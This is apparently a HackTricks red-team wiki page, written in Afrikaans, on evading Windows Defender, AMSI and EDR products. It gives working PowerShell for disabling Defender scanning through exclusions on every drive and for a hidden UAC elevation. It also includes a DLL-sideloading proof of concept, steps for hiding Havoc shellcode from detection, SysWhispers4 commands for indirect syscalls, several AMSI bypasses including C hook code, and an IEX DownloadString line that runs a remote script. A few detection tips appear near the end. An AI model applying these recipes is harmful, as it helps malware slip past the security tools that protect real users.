# Antivirus (AV)-omseiling

{{#include ../banners/hacktricks-training.md}}

**Hierdie bladsy is aanvanklik geskryf deur** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Stop Defender

- [defendnot](https://github.com/es3n1n/defendnot): ’n Hulpmiddel om te keer dat Windows Defender werk.
- [no-defender](https://github.com/es3n1n/no-defender): ’n Hulpmiddel om te keer dat Windows Defender werk deur ’n ander AV na te boots.
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

### UAC-lokmiddel in installeerderstyl voordat daar met Defender gepeuter word

Openbare loaders wat hulle as game cheats voordoen, word dikwels as ongetekende Node.js/Nexe-installeerders versprei wat eers **die gebruiker om verhoogde regte vra** en Defender eers daarna neutraliseer. Die vloei is eenvoudig:

1. Bepaal of die proses administratiewe regte het met `net session`. Die opdrag slaag slegs wanneer die gebruiker adminregte het, dus dui ’n mislukking daarop dat die loader as ’n standaardgebruiker loop.
2. Herbegin homself onmiddellik met die `RunAs`-werkwoord om die verwagte UAC-toestemmingsboodskap te aktiveer, terwyl die oorspronklike opdragreël behoue bly.

```powershell
if (-not (net session 2>$null)) {
    powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
    exit
}
```

Slagoffers glo reeds dat hulle “gekraakte” sagteware installeer, daarom aanvaar hulle gewoonlik die versoek, wat die malware die regte gee wat dit nodig het om Defender se beleid te verander.<sup>[[26]](#references)</sup>

### Omvattende `MpPreference`-uitsluitings vir elke skyfletter

Sodra dit verhoogde regte het, maksimeer GachiLoader-agtige kettings Defender se blinde kolle in plaas daarvan om die diens heeltemal te deaktiveer. Die loader beëindig eers die GUI-waghondproses (`taskkill /F /IM SecHealthUI.exe`) en voeg dan **uiters breë uitsluitings** by sodat elke gebruikersprofiel, stelselgids en verwyderbare skyf nie geskandeer kan word nie:

```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```

Sleutelwaarnemings:

- Die lus loop deur elke gemonteerde lêerstelsel (D:\, E:\, USB-stokkies, ens.) en ignoreer dus **enige toekomstige payload wat êrens op die skyf geplaas word**.
- Die uitsluiting van die `.sys`-uitbreiding is vooruitgerig—aanvallers behou die opsie om later ongetekende drywers te laai sonder om Defender weer aan te raak.
- Alle veranderinge word onder `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions` aangebring, sodat latere stadiums kan bevestig dat die uitsluitings behoue bly of dit kan uitbrei sonder om UAC weer te aktiveer.

Omdat geen Defender-diens gestop word nie, rapporteer eenvoudige gesondheidstoetse steeds “antivirus aktief”, al raak intydse inspeksie nooit daardie paaie nie.<sup>[[26]](#references)</sup>

## **AV Evasion-metodologie**

AV’s gebruik tans verskillende metodes om te bepaal of ’n lêer kwaadwillig is of nie: statiese opsporing, dinamiese ontleding en, vir die meer gevorderde EDR’s, gedragsontleding.

### **Statiese opsporing**

Statiese opsporing word bewerkstellig deur bekende kwaadwillige stringe of byte-skikkings in ’n binêre lêer of skrip te merk, en ook deur inligting uit die lêer self te onttrek (bv. lêerbeskrywing, maatskappynaam, digitale handtekeninge, ikoon, kontrolesom, ens.). Dit beteken dat bekende openbare nutsmiddels jou makliker kan uitvang, aangesien hulle waarskynlik ontleed en as kwaadwillig gemerk is. Daar is ’n paar maniere om hierdie soort opsporing te omseil:

- **Enkripsie**

As jy die binêre lêer enkripteer, sal AV nie jou program kan opspoor nie, maar jy sal ’n soort loader nodig hê om dit te dekripteer en in die geheue uit te voer.

- **Obfuskasie**

Soms hoef jy net ’n paar stringe in jou binêre lêer of skrip te verander om dit by AV verby te kry, maar dit kan tydrowend wees, afhangend van wat jy probeer obfuskateer.

- **Pasgemaakte nutsmiddels**

As jy jou eie nutsmiddels ontwikkel, sal daar geen bekende slegte handtekeninge wees nie, maar dit verg baie tyd en moeite.

> [!TIP]
> ’n Goeie manier om Windows Defender se statiese opsporing te toets, is [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Dit verdeel die lêer basies in verskeie segmente en laat Defender dan elkeen afsonderlik skandeer. So kan dit jou presies wys watter stringe of grepe in jou binêre lêer gemerk is.

Ek beveel sterk aan dat jy hierdie [YouTube-snitlys](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) oor praktiese AV Evasion gaan kyk.

### Vanlyn PE-kenmerktoetse vir statiese klassifiseerders

Verpakte of geënkripteerde payload-grepe is net een invoer vir ’n statiese klassifiseerder. EMBER2024 onttrek PE-kenmerke, insluitend invoere, uitvoere, seksies, kopskrifte en Authenticode-data.<sup>[[48]](#references)</sup> In een loader-eksperiment het die byvoeging van 141 onskuldig lykende invoere die EMBER2024-kwaadwilligheidstelling met 93% verlaag, terwyl invoere wat met malware geassosieer word, dit verhoog het. Dit is ’n resultaat vir daardie model en daardie monsters, nie ’n betroubare omseiling van ’n spesifieke AV/EDR-produk nie.<sup>[[50]](#references)</sup>

Hou vir ’n gemagtigde loader-toets die payload en uitvoeringspad konstant, verander een beoogde bouveranderlike per variant en vergelyk die tellings vanlyn. Ondersoek die PE-kenmerke wat daaruit voortspruit, aangesien ’n bouverandering meer as een kenmerkgroep kan beïnvloed.<sup>[[49]](#references)[[50]](#references)</sup> Om beoogde invoere in die IAT te behou, roep die gekose Win32-API’s aan vanuit bereikbare kode. Wissel die keuse af en versprei call sites oor bouwe eerder as om ’n vaste kamoefleerfunksie te skep wat ’n handtekening kan word. Die eksperiment het ook laer tellings gerapporteer met geldige kodeondertekening, uitvoerinskrywings en meer funksies wat `.pdata` vergroot; ongeldige ondertekening het min uitwerking gehad, en die uitwerking van `.pdata` was klein.<sup>[[50]](#references)</sup>

Die `thrember`-pakket bied kenmerkonttrekking en maatstafmodelle. Nadat jy dit geïnstalleer het, gebruik `thrember.download_models("models")` met ’n bestaande `models`-gids, en voer dan die tellinginstrument uit vanuit die ouergids: die aflaaihelper verander die huidige werkgids. Die PE-klassifiseerder kan ’n gids met bouwe beoordeel sonder om dit na ’n skanderingsdiens op te laai:<sup>[[48]](#references)</sup>

```python
from pathlib import Path
import lightgbm as lgb
import thrember

model = lgb.Booster(model_file="models/EMBER2024_PE.model")
for sample in sorted(Path("builds").glob("*.exe")):
    print(sample, thrember.predict_sample(model, sample.read_bytes()))
```

Hou die model- en feature-extractor-weergawes dieselfde tydens die vergelyking. ’n Laer offline-telling wys net hoe hierdie classifier op die veranderde binary reageer; dit bewys nie ontduiking van gedragsanalise, emulasie of ’n verskaffer se ander model nie.<sup>[[49]](#references)[[50]](#references)</sup> Sien die aparte uitvoeringsmodel vir [polimorfisme per bou en kamoeflering van die buitenste binary in gevirtualiseerde payloads](virtualized-payload-execution.md#camouflaging-the-outer-go-executable).

### **Dinamiese analise**

Dinamiese analise is wanneer die AV jou binary in ’n sandbox laat loop en na kwaadwillige aktiwiteit kyk (bv. pogings om jou blaaier se wagwoorde te dekripteer en te lees, ’n minidump van LSASS te maak, ens.). Hierdie deel kan ’n bietjie moeiliker wees om mee te werk, maar hier is ’n paar dinge wat jy kan doen om sandboxes te ontduik.

- **Wag voor uitvoering** Afhangend van hoe dit geïmplementeer is, kan dit ’n goeie manier wees om AV se dinamiese analise te omseil. AV’s het baie min tyd om lêers te skandeer sonder om die gebruiker se werkvloei te onderbreek, so lang wagtye kan die analise van binaries ontwrig. Die probleem is dat baie AV-sandboxes die wagtyd net kan oorslaan, afhangend van hoe dit geïmplementeer is.
- **Kontroleer die masjien se hulpbronne** Sandboxes het gewoonlik baie min hulpbronne beskikbaar (bv. < 2GB RAM), anders kan hulle die gebruiker se masjien vertraag. Jy kan ook baie kreatief raak, byvoorbeeld deur die CPU-temperatuur of selfs die waaierspoed te kontroleer; nie alles sal in die sandbox geïmplementeer wees nie.
- **Masjienspesifieke kontroles** As jy ’n gebruiker wil teiken wie se werkstasie aan die "contoso.local"-domein gekoppel is, kan jy die rekenaar se domein nagaan om te sien of dit ooreenstem met die een wat jy aangedui het. As dit nie ooreenstem nie, kan jy jou program laat afsluit.

Dit blyk dat Microsoft Defender se sandbox-rekenaarnaam HAL9TH is. Jy kan dus die rekenaarnaam in jou malware nagaan voordat dit uitgevoer word. As die naam HAL9TH is, beteken dit dat jy binne Defender se sandbox is, en kan jy jou program laat afsluit.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>bron: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

’n Paar ander baie goeie wenke van [@mgeeky](https://twitter.com/mariuszbit) om sandboxes te omseil

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

Soos ons vroeër in hierdie plasing gesê het, sal **openbare nutsmiddels** uiteindelik **opgespoor word**, so jy moet jouself iets afvra:

As jy byvoorbeeld LSASS wil dump, **moet jy regtig mimikatz gebruik**? Of kan jy ’n ander, minder bekende projek gebruik wat ook LSASS dump?

Laasgenoemde is waarskynlik die regte antwoord. Neem mimikatz as voorbeeld: dit is waarskynlik een van die malware-projekte wat die meeste deur AV’s en EDR’s gemerk word, indien nie die meeste nie. Alhoewel die projek self baie goed is, is dit ook ’n nagmerrie om daarmee te werk om AV’s te omseil. Soek dus bloot alternatiewe vir wat jy probeer bereik.

> [!TIP]
> Wanneer jy jou payloads vir ontduiking verander, maak seker dat jy **outomatiese voorbeelde-indiening** in Defender afskakel. En asseblief, **MOENIE NA VIRUSTOTAL OPLAAI NIE** as jou doel is om op die lang duur ontduiking te bereik. As jy wil kyk of ’n spesifieke AV jou payload opspoor, installeer dit op ’n VM, probeer om outomatiese voorbeelde-indiening af te skakel en toets dit daar totdat jy tevrede is met die resultaat.

## EXEs vs DLLs

Wanneer dit moontlik is, **gee altyd voorkeur aan DLLs vir ontduiking**. In my ervaring word DLL-lêers gewoonlik **baie minder opgespoor** en ontleed. Dit is dus ’n baie eenvoudige truuk om in sommige gevalle opsporing te vermy (natuurlik, as jou payload op een of ander manier as ’n DLL kan loop).

Soos ons in hierdie beeld kan sien, het ’n DLL-payload van Havoc ’n opsporingskoers van 4/26 op antiscan.me, terwyl die EXE-payload ’n opsporingskoers van 7/26 het.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me-vergelyking van ’n gewone Havoc EXE-payload met ’n gewone Havoc DLL</p></figcaption></figure>

Nou wys ons ’n paar truuks wat jy met DLL-lêers kan gebruik om baie meer onopvallend te wees.

## DLL Sideloading & Proxying

**DLL Sideloading** benut die DLL-soekvolgorde wat die loader gebruik deur die slagoffertoepassing en kwaadwillige payload(s) langs mekaar te plaas.

Jy kan met [Siofra](https://github.com/Cybereason/siofra) en die volgende PowerShell-skrip kyk watter programme kwesbaar is vir DLL Sideloading:

```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
    $binarytoCheck = "C:\Program Files\" + $_
    C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```

Hierdie opdrag sal die lys uitvoer van programme in "C:\Program Files\\" wat vatbaar is vir DLL hijacking, asook die DLL-lêers wat hulle probeer laai.

Ek beveel sterk aan dat jy **self programme verken wat met DLL Hijacking/Sideloading misbruik kan word**. Hierdie tegniek is redelik stealthy wanneer dit behoorlik uitgevoer word, maar as jy programme gebruik wat publiek bekend is as DLL Sideloadable, kan jy maklik gevang word.

As jy bloot 'n kwaadwillige DLL met die naam plaas van een wat 'n program verwag om te laai, sal dit nie jou payload laai nie, aangesien die program sekere funksies in daardie DLL verwag. Om hierdie probleem op te los, sal ons 'n ander tegniek genaamd **DLL Proxying/Forwarding** gebruik.

**DLL Proxying** stuur die oproepe wat 'n program maak vanaf die proxy (en kwaadwillige) DLL na die oorspronklike DLL aan. Dit behou dus die program se funksionaliteit en maak dit moontlik om die uitvoering van jou payload te hanteer.

Ek sal die [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy)-projek van [@flangvik](https://twitter.com/Flangvik/) gebruik.

Dit is die stappe wat ek gevolg het:

```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```

Die laaste opdrag sal vir ons 2 lêers gee: ’n DLL-bronkodesjabloon en die oorspronklike hernoemde DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```

Dit is die resultate:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Sowel ons shellcode (gekodeer met [SGN](https://github.com/EgeBalci/sgn)) as die proxy DLL het ’n Detection rate van 0/26 op [antiscan.me](https://antiscan.me)! Ek sou dit ’n sukses noem.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ek **beveel sterk aan** dat jy na [S3cur3Th1sShit se twitch VOD](https://www.twitch.tv/videos/1644171543) oor DLL Sideloading kyk, asook [ippsec se video](https://www.youtube.com/watch?v=3eROsG_WNpE), om meer te leer oor wat ons bespreek het.

### Misbruik van Forwarded Exports (ForwardSideLoading)

Windows PE-modules kan funksies uitvoer wat eintlik "forwarders" is: in plaas daarvan om na kode te wys, bevat die export-inskrywing ’n ASCII-string in die vorm `TargetDll.TargetFunc`. Wanneer ’n caller die export resolve, sal die Windows loader:

- `TargetDll` laai as dit nog nie gelaai is nie
- `TargetFunc` daaruit resolve

Belangrike gedrag om te verstaan:
- As `TargetDll` ’n KnownDLL is, word dit uit die beskermde KnownDLLs-namespace verskaf (bv. ntdll, kernelbase, ole32).<sup>[[15]](#references)</sup>
- As `TargetDll` nie ’n KnownDLL is nie, word die normale DLL search order gebruik, wat die directory insluit van die module wat die forward resolution uitvoer.

Dit maak ’n indirekte sideloading-primitief moontlik: vind ’n getekende DLL wat ’n funksie uitvoer wat na ’n module met ’n naam wat nie ’n KnownDLL is nie, forward, en plaas dan daardie getekende DLL saam met ’n aanvaller-beheerde DLL wat presies dieselfde naam as die forwarded target module het. Wanneer die forwarded export opgeroep word, resolve die loader die forward en laai jou DLL uit dieselfde directory, waardeur jou DllMain uitgevoer word.<sup>[[13]](#references)</sup>

Voorbeeld wat op Windows 11 waargeneem is:

```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```

`NCRYPTPROV.dll` is nie ’n KnownDLL nie, dus word dit via die normale soekvolgorde opgelos.

PoC (copy-paste):
1) Kopieer die getekende stelsel-DLL na ’n skryfbare vouer
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Plaas ’n kwaadwillige `NCRYPTPROV.dll` in dieselfde vouer. ’n Minimale DllMain is genoeg om kode-uitvoering te kry; jy hoef nie die aangestuurde funksie te implementeer om DllMain te aktiveer nie.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
    if (reason == DLL_PROCESS_ATTACH){
        HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}        
    }
    return TRUE;
}
```
3) Aktiveer die forward met ’n ondertekende LOLBin:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```

Waargenome gedrag:
- rundll32 (signed) laai die side-by-side `keyiso.dll` (signed)
- Terwyl `KeyIsoSetAuditingInterface` opgelos word, volg die loader die forward na `NCRYPTPROV.SetAuditingInterface`
- Die loader laai dan `NCRYPTPROV.dll` vanaf `C:\test` en voer sy `DllMain` uit
- As `SetAuditingInterface` nie geïmplementeer is nie, kry jy eers ’n "missing API"-fout nadat `DllMain` reeds geloop het

Wenke vir opsporing:
- Fokus op forwarded exports waar die teikenmodule nie ’n KnownDLL is nie. KnownDLLs word gelys onder `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Jy kan forwarded exports met nutsmiddels soos hierdie lys:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Sien die Windows 11-forwarder-inventaris om na kandidate te soek: https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

Idees vir opsporing/verdediging:
- Monitor LOLBins (bv. rundll32.exe) wat ondertekende DLL's vanaf nie-stelselpaadjies laai, gevolg deur die laai van nie-KnownDLLs met dieselfde basisnaam vanaf daardie gids
- Waarsku oor proses-/modulekettings soos: `rundll32.exe` → nie-stelsel-`keyiso.dll` → `NCRYPTPROV.dll` onder paaie wat deur gebruikers geskryf kan word
- Dwing kode-integriteitsbeleide (WDAC/AppLocker) af en verbied skryf- plus uitvoertoegang in toepassinggidse

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Jy kan Freeze gebruik om jou shellcode op ’n sluipende manier te laai en uit te voer.

```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```

<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ontduiking is net ’n kat-en-muis-speletjie; wat vandag werk, kan môre opgespoor word. Moet dus nooit op net een hulpmiddel staatmaak nie; probeer, indien moontlik, verskeie ontduikingstegnieke kombineer.

## Direkte/Indirekte Syscalls & SSN-resolusie (SysWhispers4)

EDR’s plaas dikwels **inline hooks in gebruikersmodus** op `ntdll.dll`-syscall-stubs. Om daardie hooks te omseil, kan jy **direkte** of **indirekte** syscall-stubs genereer wat die korrekte **SSN** (System Service Number) laai en na kernmodus oorgaan sonder om die hookte uitvoerpunt te laat loop.<sup>[[32]](#references)</sup>

**Aanroepopsies:**
- **Direct (ingebed)**: voeg ’n `syscall`/`sysenter`/`SVC #0`-instruksie by die gegenereerde stub (geen toegang tot ’n `ntdll`-uitvoer nie).
- **Indirect**: spring na ’n bestaande `syscall`-gadget binne `ntdll`, sodat dit lyk asof die kernoorgang van `ntdll` afkomstig is (nuttig om heuristiese opsporing te ontduik); **randomized indirect** kies ’n gadget uit ’n poel vir elke aanroep.
- **Egg-hunt**: vermy die inbedding van die statiese `0F 05`-opcode-volgorde op skyf; vind ’n syscall-volgorde tydens looptyd.

**Strategieë vir hook-bestande SSN-resolusie:**
- **FreshyCalls (VA sort)**: lei SSN’s af deur syscall-stubs volgens virtuele adres te sorteer, eerder as om die stub-grepe te lees.
- **SyscallsFromDisk**: karteer ’n skoon `\KnownDlls\ntdll.dll`, lees SSN’s uit sy `.text` en karteer dit daarna af (omseil alle hooks in geheue).
- **RecycledGate**: kombineer SSN-afleiding deur VA-sortering met opcode-validering wanneer ’n stub skoon is; val terug op VA-afleiding as dit hookte is.
- **HW Breakpoint**: stel DR0 op die `syscall`-instruksie en gebruik ’n VEH om die SSN tydens looptyd uit `EAX` vas te lê, sonder om hookte grepe te ontleed.

Voorbeeld van SysWhispers4-gebruik:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```

Wanneer skoon x64-`ntdll`-syscall-uitvoere vir ’n SSN geparse word, laat beide `4C 8B D1 B8` (`mov r10, rcx; mov eax, imm32`) en dieselfde volgorde voorafgegaan deur `F3 0F 1E FA` (`endbr64`) toe. Laasgenoemde is ’n CET-voorafgegaande stub: ’n parser wat aanneem dat die SSN altyd op een vaste offset is, sal dit mis. As initialisering van indirecte syscalls misluk en die loader terugval op `GetProcAddress`, kan oproepe deur daardie uitvoere weer user-mode hooks teëkom.<sup>[[54]](#references)</sup>

## AMSI (Anti-Malware Scan Interface)

AMSI is geskep om "[lêerlose wanware](https://en.wikipedia.org/wiki/Fileless_malware)" te voorkom. Aanvanklik kon AV’s net **lêers op skyf** skandeer. As jy dus payloads op een of ander manier **direk in geheue** kon uitvoer, kon die AV niks doen om dit te voorkom nie, omdat dit nie genoeg sigbaarheid gehad het nie.

Die AMSI-funksie is in hierdie Windows-komponente geïntegreer.

- User Account Control, oftewel UAC (verhoging van EXE-, COM- of MSI-lêers, of installering van ActiveX)
- PowerShell (scripts, interaktiewe gebruik en dinamiese kode-evaluering)
- Windows Script Host (wscript.exe en cscript.exe)
- JavaScript en VBScript
- Office VBA-makro’s

Dit stel antivirusoplossings in staat om scriptgedrag te ondersoek deur scriptinhoud in ’n vorm bloot te stel wat onversleuteld en nie-geobfuskueer is.

As jy `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` uitvoer, sal dit die volgende waarskuwing in Windows Defender veroorsaak.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Let op hoe dit `amsi:` byvoeg, gevolg deur die pad na die uitvoerbare lêer waaruit die script uitgevoer is; in hierdie geval, powershell.exe

Ons het geen lêer na skyf geskryf nie, maar is steeds in geheue opgespoor weens AMSI.

Verder, vanaf **.NET 4.8**, word C#-kode ook deur AMSI verwerk. Dit raak selfs `Assembly.Load(byte[])` wanneer dit gebruik word om kode in geheue uit te voer. Daarom word dit aanbeveel om laer weergawes van .NET (soos 4.7.2 of vroeër) vir uitvoering in geheue te gebruik as jy AMSI wil ontduik.

Daar is ’n paar maniere om AMSI te omseil:

- **Obfuskering**

Aangesien AMSI hoofsaaklik met statiese opsporing werk, kan die wysiging van die scripts wat jy probeer laai ’n goeie manier wees om opsporing te ontduik.

AMSI kan egter scripts deobfuskueer, selfs al het hulle verskeie lae. Afhangend van hoe dit gedoen word, kan obfuskering dus ’n swak opsie wees. Dit maak ontduiking nie juis eenvoudig nie. Soms hoef jy egter net ’n paar veranderlike name te verander, en dan is jy reg; dit hang dus af van hoe sterk iets gemerk is.

- **AMSI-omseiling**

Omdat AMSI geïmplementeer word deur ’n DLL in die powershell-proses (ook cscript.exe, wscript.exe, ens.) te laai, is dit maklik om daarmee te peuter, selfs wanneer jy as ’n gebruiker sonder spesiale voorregte werk. Weens hierdie fout in AMSI se implementering het navorsers verskeie maniere gevind om AMSI-skandering te ontduik.

**Veroorsaak ’n fout**

As jy AMSI-initialisering dwing om te misluk (amsiInitFailed), sal geen skandering vir die huidige proses begin word nie. Dit is oorspronklik deur [Matt Graeber](https://twitter.com/mattifestation) bekend gemaak, en Microsoft het ’n signature ontwikkel om wydverspreide gebruik te voorkom.

```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

Al wat nodig was, was een reël PowerShell-kode om AMSI vir die huidige PowerShell-proses onbruikbaar te maak. Hierdie reël is natuurlik deur AMSI self gemerk, dus is ’n mate van wysiging nodig om hierdie tegniek te gebruik.

Hier is ’n aangepaste AMSI bypass wat ek uit hierdie [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db) geneem het.

```bash
Try{#Ams1 bypass technic nº 2
      $Xdatabase = 'Utils';$Homedrive = 'si'
      $ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
      $DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
      $fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
      $CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
      $Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
      $SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
      $Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
      $Spotfix.SetValue($null,$true)
   }Catch{Throw $_}
```

Hou in gedagte dat dit waarskynlik gemerk sal word sodra hierdie plasing verskyn. Jy behoort dus geen kode te publiseer as jou plan is om onopgemerk te bly nie.

**Memory Patching**

Hierdie tegniek is aanvanklik deur [@RastaMouse](https://twitter.com/_RastaMouse/) ontdek. Dit behels dat die adres van die "AmsiScanBuffer"-funksie in amsi.dll gevind word (wat verantwoordelik is vir die skandering van invoer wat deur die gebruiker verskaf word), en dat dit met instruksies oorskryf word om die kode vir E_INVALIDARG terug te gee. Op dié manier gee die werklike skandering se resultaat 0 terug, wat as 'n skoon resultaat geïnterpreteer word.

> [!TIP]
> Lees gerus [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) vir 'n meer gedetailleerde verduideliking.

Daar is ook baie ander tegnieke om AMSI met powershell te omseil. Kyk na [**hierdie bladsy**](basic-powershell-for-pentesters/index.html#amsi-bypass) en [**hierdie repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) om meer daaroor te wete te kom.

### AMSI COM-scan-pointer-herleiding in plaas van `AmsiScanBuffer`-patching

Nog 'n proses-lokale omseiling laat die `AmsiScanBuffer`-ingangspunt onaangeraak. In die gerapporteerde 64-bis .NET-loader word 'n AMSI COM-objek vanaf CLSID `fdb00e52-a214-4aa1-8fba-4357bb0072ec` geskep; `Marshal.GetIUnknownForObject()` lewer die koppelvlakwyser, en die vtable-gleuf by offset `0x18` word as die teiken vir die skanderingaanroep gebruik. Die loader patch 'n inheemse wyser vir `Console.Clear()` met 'n klein x64-stub, verander daardie vtable-inskrywing met `VirtualProtect()` na die stub en herstel dan die oorspronklike bladsybeskerming. Beide die 64-bis-wyserwydte en die verwagte COM-uitleg is voorvereistes; dit is nie 'n generiese offset vir arbitrêre AMSI-koppelvlakke of -bouweergawes nie. Die vroeër waargenome fases is [onderteken AppDomainManager-sidecar-laai](windows-local-privilege-escalation/dll-hijacking/#signed-appdomainmanager-type-as-a-configuration-file-gadget) en [RESX-deserialisering](../pentesting-web/deserialization/basic-.net-deserialization-objectdataprovider-gadgets-expandedwrapper-and-json.net.md#resx-resource-parsing-to-binaryformatter-and-xaml).<sup>[[51]](#references)</sup>

Die waargenome stub-grepe is `41 C7 00 01 00 00 00 33 C0 C3`: hulle skryf **1** na die resultaatwyser in `r8` en gee **0** in `eax` terug. Die gerapporteerde bewering dat die skanderingresultaat `AMSI_RESULT_CLEAN` (0) is, verwar dus die `S_OK`-terugkeerwaarde met die uitvoer-enum. In die gedokumenteerde `AMSI_RESULT`-volgorde is resultaat **1** `AMSI_RESULT_NOT_DETECTED`; dit bly onder die opsporingsdrempel.<sup>[[51]](#references)[[52]](#references)[[53]](#references)</sup>

### Blokkeer AMSI deur te verhoed dat amsi.dll laai (LdrLoadDll-hook)

AMSI word slegs geïnisialiseer nadat `amsi.dll` in die huidige proses gelaai is. 'n Robuuste, taal-onafhanklike omseiling is om 'n gebruikersmodus-hook op `ntdll!LdrLoadDll` te plaas wat 'n fout teruggee wanneer die aangevraagde module `amsi.dll` is. Gevolglik laai AMSI nooit, en vind geen skanderings vir daardie proses plaas nie.<sup>[[23]](#references)</sup>

Implementeringsoorsig (x64 C/C++-pseudokode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
    if (module && module->Buffer){
        UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
        if (RtlEqualUnicodeString(module, &amsi, TRUE)){
            // Pretend the DLL cannot be found → AMSI never initialises in this process
            return STATUS_DLL_NOT_FOUND; // 0xC0000135
        }
    }
    return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
    // Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
    // e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Notas
- Werk met PowerShell, WScript/CScript en pasgemaakte loaders (enigiets wat andersins AMSI sou laai).
- Kombineer dit met die voer van scripts via stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) om lang opdragreëlspore te vermy.
- Is al gebruik deur loaders wat via LOLBins uitgevoer word (bv. `regsvr32` wat `DllRegisterServer` oproep).

Die tool **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** genereer ook scripts om AMSI te omseil.
